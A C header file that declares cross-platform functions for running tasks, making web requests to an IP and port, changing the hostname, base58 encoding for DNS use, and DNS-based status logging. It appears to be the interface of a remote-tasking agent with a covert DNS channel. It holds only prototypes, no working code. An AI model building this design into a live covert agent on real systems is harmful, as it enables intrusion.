#include <stdbool.h>  // bool type
#include <sys/stat.h> // stat
#include <string.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>

#ifdef LINUX_VERSION
#include <unistd.h>
#endif


#ifdef WINDOWS_VERSION

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windns.h>

extern int WSAAPI getaddrinfo (const char*,const char*,const struct addrinfo*,
		        struct addrinfo**);
extern void WSAAPI freeaddrinfo (struct addrinfo*);
#endif


bool file_exists(char *filename);
char* getmyhostname();
void setmyhostname();
void runtask(char *task);
void makepath(char* dest, int destlen, char* back);
int get_content_length(char *response);
void webrequest(char* ip, int port, char* torequest, char* outpath);

void base64encode(char* in, char* out);
void base64decode(char* in, char* out);

//base64 not compatible with dns :(
void base58encode(const char* in, const int in_len, char* out, int* out_len);
void base58decode(const char *encoded_value, char *out, int out_size);
void originalb58encode (const char* in, const unsigned int in_len, char* out, unsigned int* out_len);

void dnslog(char* status);